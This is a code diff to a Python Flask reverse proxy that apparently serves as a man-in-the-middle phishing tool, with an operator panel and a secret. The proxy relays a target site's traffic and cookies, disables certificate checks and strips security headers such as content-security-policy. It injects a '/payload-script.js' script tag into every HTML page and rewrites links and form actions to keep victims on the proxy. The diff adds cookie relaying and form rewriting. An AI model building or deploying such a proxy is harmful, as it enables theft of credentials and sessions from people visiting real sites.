@@ -67,7 +67,6 @@ def start_proxy(target, host, port, secret):
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
-        # Debug logging
         print(f"[*] Incoming request: {request.method} {path}")
         
         # Handle panel requests
@@ -88,33 +87,27 @@ def start_proxy(target, host, port, secret):
         
         print(f"[*] Proxying to: {target_url}")
 
-        # Handle OPTIONS for CORS
-        if request.method == 'OPTIONS':
-            return Response('', 200, {
-                'Access-Control-Allow-Origin': '*',
-                'Access-Control-Allow-Methods': '*',
-                'Access-Control-Allow-Headers': '*'
-            })
-
         try:
-            # Forward the request
+            # Preserve original headers and add necessary ones
+            headers = {
+                key: value for key, value in request.headers if key.lower() not in [
+                    'host', 
+                    'content-length',
+                    'connection',
+                ]
+            }
+            headers['Host'] = target
+            
+            # Forward the request with all data
             resp = requests.request(
                 method=request.method,
                 url=target_url,
-                headers={
-                    key: value for key, value in request.headers if key.lower() not in [
-                        'host', 
-                        'content-length',
-                        'connection',
-                        'origin',
-                        'referer'
-                    ]
-                },
+                headers=headers,
                 data=request.get_data(),
                 cookies=request.cookies,
-                allow_redirects=True,  # Allow redirects within the proxy
+                allow_redirects=True,
                 verify=False,
-                stream=True  # Stream the response
+                stream=True
             )
 
             # Process response headers
@@ -124,29 +117,28 @@ def start_proxy(target, host, port, secret):
                 'transfer-encoding', 
                 'connection',
                 'strict-transport-security',
-                'content-security-policy'
             ]
             
-            headers = [
+            response_headers = [
                 (name, value) 
                 for name, value in resp.raw.headers.items() 
                 if name.lower() not in excluded_headers
             ]
 
-            # Add CORS headers
-            headers.extend([
-                ('Access-Control-Allow-Origin', '*'),
-                ('Access-Control-Allow-Methods', '*'),
-                ('Access-Control-Allow-Headers', '*')
-            ])
+            # Process cookies from response
+            if 'set-cookie' in resp.headers:
+                cookies = resp.headers.getlist('set-cookie')
+                for cookie in cookies:
+                    response_headers.append(('Set-Cookie', cookie))
 
             # Process and inject payload if HTML
             content_type = resp.headers.get('Content-Type', '')
             if 'text/html' in content_type.lower():
                 try:
                     content = resp.content.decode('utf-8')
-                    payload = '<script src="/payload-script.js"></script>'
                     
+                    # Inject our payload
+                    payload = '<script src="/payload-script.js"></script>'
                     if '</head>' in content:
                         content = content.replace('</head>', f'{payload}</head>')
                     elif '<body>' in content:
@@ -156,10 +148,13 @@ def start_proxy(target, host, port, secret):
                     content = content.replace('href="/', f'href="/{path}' if path else 'href="/')
                     content = content.replace('src="/', f'src="/{path}' if path else 'src="/')
                     
+                    # Fix form actions
+                    content = content.replace('action="/', f'action="/{path}' if path else 'action="/')
+                    
                     return Response(
                         content.encode('utf-8'),
                         resp.status_code,
-                        headers
+                        response_headers
                     )
                 except UnicodeDecodeError:
                     pass
@@ -168,7 +163,7 @@ def start_proxy(target, host, port, secret):
             return Response(
                 resp.raw.read(),
                 resp.status_code,
-                headers
+                response_headers
             )
 
         except Exception as e:
